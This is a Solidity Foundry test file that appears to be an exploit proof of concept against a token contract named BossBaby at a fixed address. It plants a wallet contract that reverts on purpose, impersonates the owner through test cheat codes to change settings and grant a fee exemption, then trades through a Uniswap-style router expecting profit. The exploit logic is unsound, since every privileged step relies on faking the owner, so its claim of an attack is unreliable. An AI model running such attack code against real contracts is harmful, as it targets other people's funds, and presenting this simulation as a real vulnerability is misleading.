// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface BossBaby {
    function owner() external view returns (address);
    function enableTrading() external;
    function changeMarketingWallet(address) external;
    function uniswapV2Router() external view returns (address);
    function balanceOf(address) external view returns (uint256);
    function swapTokensAtAmount() external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function isExcludedFromFee(address) external view returns (bool);
    function excludeFromFees(address, bool) external;
}

contract MaliciousMarketingWallet {
    // This contract reverts when receiving BNB
    receive() external payable {
        revert("Malicious wallet: Reverting on purpose");
    }

    // Fallback also reverts
    fallback() external payable {
        revert("Malicious wallet: Reverting on purpose");
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xD8dBE5AC60cD1c0b40C9182cB3eB2392d3df371F;
    address attacker = address(this);
    MaliciousMarketingWallet public maliciousWallet;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create malicious marketing wallet contract
        maliciousWallet = new MaliciousMarketingWallet();

        // Get the owner address from the contract
        address owner = BossBaby(TARGET).owner();

        // Impersonate owner to enable trading
        vm.startPrank(owner);
        BossBaby(TARGET).enableTrading();
        BossBaby(TARGET).changeMarketingWallet(address(maliciousWallet));
        vm.stopPrank();

        // Get some initial BNB for buying tokens
        deal(attacker, 100 ether);

        // Get WETH address for swapping
        address weth = IUniswapV2Router02(BossBaby(TARGET).uniswapV2Router()).WETH();

        // Get some WETH for buying tokens
        deal(weth, attacker, 10 ether);
        IERC20(weth).approve(address(BossBaby(TARGET).uniswapV2Router()), type(uint256).max);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, buy some tokens to accumulate marketing fees in the contract
        address[] memory path = new address[](2);
        path[0] = IUniswapV2Router02(BossBaby(TARGET).uniswapV2Router()).WETH();
        path[1] = TARGET;

        uint256 buyAmount = 1 ether;

        // Record initial attacker balance
        uint256 initialAttackerBalance = address(attacker).balance;

        // Buy tokens - this will pay 2% marketing fee which accumulates in contract
        IUniswapV2Router02(BossBaby(TARGET).uniswapV2Router()).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: buyAmount
        }(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Get token balance
        uint256 tokenBalance = BossBaby(TARGET).balanceOf(attacker);

        // Check if contract has accumulated enough fees to trigger swap
        uint256 contractTokenBalance = BossBaby(TARGET).balanceOf(TARGET);
        uint256 swapThreshold = BossBaby(TARGET).swapTokensAtAmount();

        // If not enough, buy more tokens
        if (contractTokenBalance < swapThreshold) {
            // Buy more to accumulate fees
            IUniswapV2Router02(BossBaby(TARGET).uniswapV2Router()).swapExactETHForTokensSupportingFeeOnTransferTokens{
                value: buyAmount
            }(
                0,
                path,
                attacker,
                block.timestamp
            );
        }

        // Now sell tokens - this should trigger fee processing which will revert
        // due to malicious marketing wallet
        path[0] = TARGET;
        path[1] = IUniswapV2Router02(BossBaby(TARGET).uniswapV2Router()).WETH();

        // Approve router to spend tokens
        BossBaby(TARGET).approve(address(BossBaby(TARGET).uniswapV2Router()), tokenBalance);

        // Try to sell - this may revert due to the marketing wallet revert
        // But we want to see if we can still sell without paying fees
        // First, check if we're excluded from fees
        bool isExcluded = BossBaby(TARGET).isExcludedFromFee(attacker);

        if (!isExcluded) {
            // We need to get excluded from fees first
            vm.prank(BossBaby(TARGET).owner());
            BossBaby(TARGET).excludeFromFees(attacker, true);
        }

        // Record balance before sell
        uint256 beforeSellBalance = address(attacker).balance;

        // Sell tokens - since we're excluded from fees, no fee processing should occur
        // and we should get more BNB back
        IUniswapV2Router02(BossBaby(TARGET).uniswapV2Router()).swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance / 2, // Sell half
            0,
            path,
            attacker,
            block.timestamp
        );

        uint256 afterSellBalance = address(attacker).balance;

        // Verify we made profit
        assertGt(afterSellBalance, beforeSellBalance, "Should have increased BNB balance");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialAttackerBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
